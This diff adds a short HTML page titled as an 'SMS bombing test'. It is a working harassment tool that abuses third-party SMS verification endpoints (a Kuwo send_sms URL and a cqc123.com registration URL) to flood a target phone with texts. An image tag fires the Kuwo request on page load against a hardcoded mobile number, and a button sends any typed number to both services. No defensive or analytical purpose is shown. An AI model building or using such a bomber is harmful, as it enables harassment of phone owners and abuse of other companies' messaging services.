@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title>短信轰炸测试</title>
+	</head>
+	<body>
+		<input id="mobile" class="test" type="text" />
+		<button id="send">发送验证码</button>
+		<img src="http://i.kuwo.cn/US/2014/api/send_sms.jsp?mobile=13112191463"/>
+	</body>
+	<script type="text/javascript" src="js/jquery-3.1.1.js"></script>
+	<script type="text/javascript">
+	$('#send').on("click",function(){
+		var mobile=$("#mobile").val();
+		$.ajax({
+			type:"get",
+			url:"http://i.kuwo.cn/US/2014/api/send_sms.jsp?mobile="+mobile,
+			async:true,
+			success:function(){
+				alert('发送成功');
+			}
+		});
+		
+		
+		$.ajax({
+				type: "post",
+				async: false,
+				dataType: "json",
+				data: {
+					"phone":mobile,"code":null
+				},
+				url: "http://www.cqc123.com/phone-register!init.json"
+	});
+	
+	})	
+	</script>
+</html>
